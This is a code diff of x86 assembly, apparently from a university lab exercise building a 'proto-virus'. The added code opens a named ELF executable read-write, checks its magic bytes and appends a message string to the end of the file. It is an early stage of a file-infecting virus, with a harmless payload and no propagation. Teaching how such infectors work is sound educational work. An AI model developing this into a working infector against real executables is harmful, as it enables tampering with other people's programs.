@@ -59,22 +59,31 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
-	open FileName, O_RDONLY, 0644
-	
-	
+	open FileName, RDWR, 0644
+	mov [ebp-4], eax
+	read [ebp-4], elf_bytes, 4
+	lseek [ebp-4], 0, SEEK_END
+	mov ecx, 4
+	mov ebx, 0x7F454C46
+check_bytes:
+	cmp bl, byte [elf_bytes + ecx -1] ; .ELF = 0x7F 45 4C 46
+	jnz fail
+	shr ebx, 8
+	loop check_bytes, ecx
+	write [ebp-4], OutStr, 31
+	write 1, OutStr, 31
+	jmp VirusExit
 
-
-
-
+fail:
+    write 1, Failstr, 12
 
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
 	
-FileName:	db "ELFexec1", 0
+FileName:	db "ELFexec2short", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:        db "perhaps not", 10 , 0
-	
 
 get_my_loc:
 	call next_i
@@ -83,3 +92,6 @@ next_i:
 	ret	
 PreviousEntryPoint: dd VirusExit
 virus_end:
+
+    section .bss
+        elf_bytes:  resb    4
